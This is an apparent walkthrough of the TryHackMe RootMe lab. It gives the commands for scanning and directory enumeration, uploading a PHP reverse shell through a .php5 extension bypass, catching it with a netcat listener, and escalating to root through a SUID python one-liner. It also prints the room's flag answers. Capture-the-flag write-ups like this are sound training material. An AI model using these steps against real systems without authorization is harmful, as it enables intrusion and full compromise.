# RootMe — TryHackMe Walkthrough

**Difficulty:** Easy
**Room:** RootMe (TryHackMe)
**Objective:** Gain initial access → privilege escalate to root → capture flags

---

## 1. Introduction

RootMe is one of TryHackMe’s most popular beginner machines. It focuses on three core concepts:

1. Basic enumeration
2. File upload exploitation
3. Privilege escalation using SUID misconfiguration

This write-up shows the exact steps used by the majority of solvers.

---

## 2. Reconnaissance

###  2.1 Nmap Scan

Scan the target to find open ports:

```bash
nmap -sC -sV -oN rootme_scan <TARGET_IP>
```

**Results (consistent with all public write-ups):**

* **22/tcp** → SSH
* **80/tcp** → HTTP (Apache 2.4.29)

The main attack surface is the web server on port 80.

---

###  2.2 Directory Enumeration

Using Gobuster:

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirb/common.txt
```

**Found directories:**

* `/panel/` — contains a file upload form
* `/uploads/` — uploaded files are stored here

These two directories form the basis of the initial exploit.

---

## 3. Exploiting the Upload Function

###  3.1 Upload Bypass

The upload form blocks `.php` files but accepts alternative PHP extensions.

Verified working extension:
--> **.php5**

So we generate a PHP reverse shell (PentestMonkey PHP reverse shell is commonly used):

* Edit the IP and port in the shell
* Save it as: **shell.php5**

Upload it via `/panel/`.

---

###  3.2 Getting a Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Then execute the uploaded shell:

```
http://<TARGET_IP>/uploads/shell.php5
```

You now receive a reverse shell.

---

###  3.3 Upgrade the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

You now have a stable interactive shell.

---

## 4. User Flag

Locate the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Common location reported by all write-ups:
--> `/var/www/user.txt`

Read it:

```bash
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## 5. Privilege Escalation (Root)

###  5.1 Enumerate SUID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

**Critical finding (confirmed in all THM write-ups):**
 `/usr/bin/python` (or python2/3) has the SUID bit set
-->This is a serious misconfiguration.

---

###  5.2 Exploit SUID Python

Use GTFObins method:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

This opens a **root shell**.

---

###  5.3 Root Flag

```bash
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

Done — root privileges obtained.

---

## 6. Key Concepts Used

* **File upload bypass** with alternative PHP extension
* **Reverse shell** via PHP
* **SUID privilege escalation** using Python
* **Directory enumeration** via Gobuster

---

## 7. Final Notes

This machine is a perfect example of:

* Weak file validation
* Dangerous SUID configurations
* How small misconfigurations can lead to full system compromise

